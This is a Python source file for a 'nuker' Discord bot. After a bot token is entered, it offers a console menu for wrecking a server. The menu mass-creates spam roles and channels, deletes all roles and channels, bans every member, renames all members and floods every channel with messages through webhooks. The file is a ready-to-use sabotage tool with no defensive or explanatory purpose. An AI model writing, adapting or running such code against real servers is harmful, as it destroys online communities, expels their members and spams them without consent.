#made and scripted by zufinho
import os
import time
import random
try:
    import discord
    from discord.ext import commands
    from discord.utils import get
    from discord_webhook import DiscordWebhook

except:
    os.system("pip install discord.py discord-webhook && start echo Re-run the program.")

version="2.5.5"

prefix="."
descriptionset=""
os.system("cls")
os.system("title zufinho nuker V2")
while True:
    os.system("cls")
    print("zufinho nuker ")
    print("version",version)
    print()
    print()
    print("[1] Insert Token                             [2] Run (if u already inserted token)")
    print("[3] Set prefix (prefix predenifed is .)      [4] Exit")
    command=input(">")
    if command=="1":
        os.system("cls")
        print("zufinho nuker")
        print("version 2.5.3")
        print()
        print()
        print("Insert bot token")
        token=input(">")
        os.system("cls")
        print("zufinho nuker")
        print("version ",version)
        print()
        print()
        print("Token changed!")
        time.sleep(1.5)
        os.system("cls")
    if command=="2":
        break
    if command=="3":
        os.system("cls")
        print("zufinho nuker")
        print("version ",version)
        print()
        print()
        print("Set the prefix")
        prefix=input(">")
        os.system("cls")
        print("zufinho nuker")
        print("version ",version)
        print()
        print()
        print("Prefix changed!")
        time.sleep(1.5)
    if command=="4":
        os.system("cls")
        exit()
os.system("cls")




intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix=prefix, description=descriptionset, intents=intents)

@bot.command()
async def execute(ctx):
    async def spamrole(ctx):
        print("roles name:")
        rolespamname=input(">")
        print("amount of roles:")
        rolespamamount=int(input(">"))
        rolespamnumber=0
        while True:
            await guild.create_role(name=rolespamname)
            print("created role with name",rolespamname)
            if rolespamnumber<rolespamamount:
                rolespamnumber=rolespamnumber+1
            elif rolespamnumber>=rolespamamount:
                print("created role number",rolespamnumber,"with name",rolespamname)
                print("finished")
                print(f"created {rolespamnumber} roles with sucess")
                rolespamnumber=0
                time.sleep(1.5)
                break
    async def delroles(ctx):
        for role in ctx.guild.roles:
            deletedroles=0
            try:  
                await role.delete()
                print(f"role {role.name} deleted")
                deletedroles=deletedroles+1
            except:
                print(f"cannot delete {role.name}")
        print(f"deleted {deletedroles} with sucess")
        deletedroles=0
        time.sleep(1.5)
    async def channelspam(ctx):
        channelspamnumber=0
        print("what name of channels?")
        channelspamname=input(">")
        print()
        print("what type of channel (text/voice)")
        channeltype=input(">")
        print()
        print("amount of channels")
        channelsamount=int(input(">"))
        if channeltype=="voice":
            while True:
                await guild.create_voice_channel(channelspamname)
                if channelspamnumber<channelsamount:
                    channelspamnumber=channelspamnumber+1
                elif channelspamnumber>=channelsamount:
                    print("created channel number",channelspamnumber,"with name",channelspamname,"type text channel")
                    print("finished")
                    time.sleep(1.5)
                    break
                print("created channel number",channelspamnumber,"with name",channelspamname,"type voice channel")
        else:
            while True:
                await guild.create_text_channel(channelspamname)
                if channelspamnumber<channelsamount:
                    channelspamnumber=channelspamnumber+1
                elif channelspamnumber>=channelsamount:
                    print("created channel number",channelspamnumber,"with name",channelspamname,"type text channel")
                    print("finished")
                    time.sleep(1.5)
                    break
                print("created channel number",channelspamnumber,"with name",channelspamname,"type text channel")
    async def delchannels(ctx):
        for channel in ctx.guild.channels:  
            try:
                await channel.delete()
                print(channel,"deleted")
            except:
                print(f"Cannot delete {channel.name}")
    async def ban(ctx):
        membermany = 0
        memberrestant = 0
        for member in ctx.guild.members:
            print("counting how many members have...")
            print(membermany)
            membermany=membermany+1
        membermany=membermany-1
        while True:
            for member in ctx.guild.members:
                try:
                    await member.ban(reason="zufinho nuker")
                    print(f"banned {member.display_name}")
                except:
                    print(f"could not ban {member.display_name}")
                    memberrestant=memberrestant+1
                if memberrestant==membermany:
                    print(f"{memberrestant} member has banned")
                    break
                elif memberrestant<membermany:
                    memberrestant=memberrestant+1
            time.sleep(1.5)
    async def nickall(ctx):
        nickallnumber=0
        print("choice a nick to change:")
        nickallname=input(">")
        for member in guild.members:
            try:
                await member.edit(nick=nickallname)
                nickallnumber=nickallnumber+1
                print(f"{member.name} nick has been changed")
            except:
                print(f"cannot change nick of {member.name}")
        print(f"finished with {nickallnumber} peoples nickname changed to {nickallname}")
        time.sleep(1.5)
    async def webhookspam(ctx):
        guild = ctx.guild
        messagespamtimes=0
        messagespammany=0
        print("insert message:")
        messagespammessage=input(">")
        print()
        print("repeat how many times")
        messagespamtimes=int(input(">"))
        while messagespamtimes>messagespammany:
            for channel in guild.channels:
                webhookcreate = await channel.create_webhook(name="zufinho nuker")
                print(f"created webhook at {channel.name} channel")
                webhook = DiscordWebhook(url=webhookcreate.url, rate_limit_retry=False,timeout=0,content=messagespammessage)
                webhooksender = webhook.execute()
                print(f"send message to channel {channel.name}")
                messagespammany=messagespammany+1
        messagespamtimes=0
        messagespammany=0
    guild = ctx.guild
    while True:
        commandnuker="ez"
        os.system("cls")
        print("zufinho nuker")
        print("version ",version)
        print()
        print()
        print("[1] Role Spammer                 [2] Role Deleter")
        print("[3] Channel Spam                 [4] Channel Deleter")
        print("[5] Ban all                      [6] Change nick all")
        print("[7] Webhook Spam")
        commandnuker=int(input(">"))
        if commandnuker==1:
            os.system("cls")
            print("zufinho nuker")
            print()
            print()
            print()
            await spamrole(ctx)
        if commandnuker==2:
            os.system("cls")
            print("zufinho nuker")
            print("version",version)
            print()
            print()
            await delroles(ctx)
        if commandnuker==3:
            os.system("cls")
            print("zufinho nuker")
            print("version",version)
            print()
            print()
            await channelspam(ctx)
        if commandnuker==4:
            os.system("cls")
            print("zufinho nuker")
            print("version",version)
            print()
            print()
            await delchannels(ctx)
        if commandnuker==5:
            os.system("cls")
            print("zufinho nuker")
            print("version",version)
            print()
            print()
            await ban(ctx)
        if commandnuker==6:
            os.system("cls")
            print("zufinho nuker")
            print("version",version)
            print()
            print()
            await nickall(ctx)
        if commandnuker==7:
            os.system("cls")
            print("zufinho nuker")
            print("version",version)
            print()
            print()
            await webhookspam(ctx)
print(f"digit {prefix}execute in a chat to start nuker")
bot.run(token)